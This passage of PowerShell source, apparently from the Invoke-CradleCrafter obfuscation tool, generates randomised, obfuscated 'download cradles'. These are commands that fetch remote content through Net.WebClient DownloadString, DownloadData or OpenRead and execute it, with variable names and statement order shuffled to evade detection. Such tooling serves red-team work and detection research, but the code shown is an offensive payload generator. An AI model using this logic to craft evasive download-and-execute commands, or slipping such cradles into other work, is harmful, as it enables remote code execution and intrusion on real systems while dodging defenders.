                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If($DownloadString.Contains('DownloadString'))
                        {
                            $DownloadStringWithTags = $DownloadStringWithTags.Trim("'").Replace($DownloadString,("'" + $DownloadString + "'")).Replace("''","'")
                            $DownloadString         = "'" + $DownloadString.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If(!$DownloadString.Contains('DownloadString'))
                        {
                            If($DownloadString.StartsWith('<<<0')) {$DownloadString = $DownloadString.SubString(0,4) + '(' + $DownloadString.SubString(4)}
                            Else                                   {$DownloadString = '(' + $DownloadString}
                              
                            If($DownloadString.StartsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.Length-4) + ')' + $DownloadString.SubString($DownloadString.Length-4)}
                            Else                                   {$DownloadString = $DownloadString + ')'}
                        }

                        # Encapsulate GetVar3 syntax if it contains whitespace.
                        If($GetVar3.Contains(' '))
                        {
                            $GetVar3 = "($GetVar3)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1$NetWebClient::New()"
                        $CommandArray += "$SetVar3$DownloadString"
                          
                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1$NetWebClient::New()"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]  + $CommandArray[3,4]  -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3] -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If(!$DownloadString.Contains('DownloadString'))
                        {
                            If($DownloadString.StartsWith('<<<0')) {$DownloadString = $DownloadString.SubString(0,4) + '(' + $DownloadString.SubString(4)}
                            Else                                   {$DownloadString = '(' + $DownloadString}
                              
                            If($DownloadString.StartsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.Length-4) + ')' + $DownloadString.SubString($DownloadString.Length-4)}
                            Else                                   {$DownloadString = $DownloadString + ')'}
                        }

                        # Encapsulate GetVar3 syntax if it contains whitespace.
                        If($GetVar3.Contains(' '))
                        {
                            $GetVar3 = "($GetVar3)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar3$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]  + $CommandArray[3,4]  -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3] -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        5 {
            ##################################################
            ## [Net.WebClient]::New - DownloadData - PS3.0+ ##
            ##################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # Handle embedded tagging.
                    If($ByteWithTags.StartsWith('<<<0') -AND $ByteWithTags.EndsWith('0>>>'))
                    {
                        $ByteWithTags = $ByteWithTags.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                    }
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    $SyntaxToInvoke         = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,"$NetWebClient::New().$DownloadData('$Url')"))
                    $SyntaxToInvokeWithTags = $JoinWithTags.Replace($JoinTag,$ByteWithTags.Replace($ByteTag,"$NetWebClientWithTags::New().$DownloadDataWithTags('$UrlWithTags')"))

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace(        '.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'ds'  # DownloadData (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 )

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++) 
                    {
                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If($DownloadData.Contains('DownloadData'))
                        {
                            $DownloadDataWithTags = $DownloadDataWithTags.Trim("'").Replace($DownloadData,("'" + $DownloadData + "'")).Replace("''","'")
                            $DownloadData         = "'" + $DownloadData.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1$NetWebClient::New()"
                        $CommandArray += "$SetVar3$DownloadData"
                          
                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadData.Contains("'DownloadData'"))
                        {
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1$NetWebClient::New()"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]  -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadData in single quotes if basic syntax is used.
                    If($DownloadData -eq 'DownloadData')
                    {
                        $DownloadDataWithTags = $DownloadDataWithTags.Replace($DownloadData,("'" + $DownloadData + "'"))
                        $DownloadData         = "'" + $DownloadData + "'"
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If(!$DownloadData.Contains('DownloadData'))
                        {
                            If($DownloadData.StartsWith('<<<0')) {$DownloadData = $DownloadData.SubString(0,4) + '(' + $DownloadData.SubString(4)}
                            Else                                 {$DownloadData = '(' + $DownloadData}
                              
                            If($DownloadData.StartsWith('0>>>')) {$DownloadData = $DownloadData.SubString(0,$DownloadData.Length-4) + ')' + $DownloadData.SubString($DownloadData.Length-4)}
                            Else                                 {$DownloadData = $DownloadData + ')'}
                        }

                        # Encapsulate GetVar4 syntax if it contains whitespace.
                        If($GetVar4.Contains(' '))
                        {
                            $GetVar4 = "($GetVar4)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Remove single quotes if default 'DownloadData' value is used.
                        If($DownloadData.Contains("'DownloadData'"))
                        {
                            # Remove single quotes when DownloadData is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]  -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        6 {
            ##############################################
            ## [Net.WebClient]::New - OpenRead - PS3.0+ ##
            ##############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'or'  # OpenRead (Method)
                    $RandomVarName4 = 'sr'  # StreamReader
                    $RandomVarName5 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Encapsulate OpenRead in single quotes if basic syntax is used.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # Add encapsulating parentheses if non-default variable syntax is used.                      
                    If(!$GetVar3.StartsWith('$'))
                    {
                        $GetVar3WithTags = $GetVar3WithTags.Replace($GetVar3,('(' + $GetVar3 + ')'))
                        $GetVar3 = '(' + $GetVar3 + ')'
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','OpenRead','OpenReadForStream','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        $Response = "$GetVar1.$GetVar3($GetVar2)"

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        $Stream = $Stream.Replace($ResponseTag,$Response)
                        $Stream = $Stream.Replace($SRSetVarTag,$SetVar4)
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar4)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar5)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar3$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar3($GetVar2)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Remove single quotes if default 'OpenRead' value is used.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $Array2IndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar5
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar3,$OpenRead)
                            $SyntaxToInvoke = $GetVar5
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                          
                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
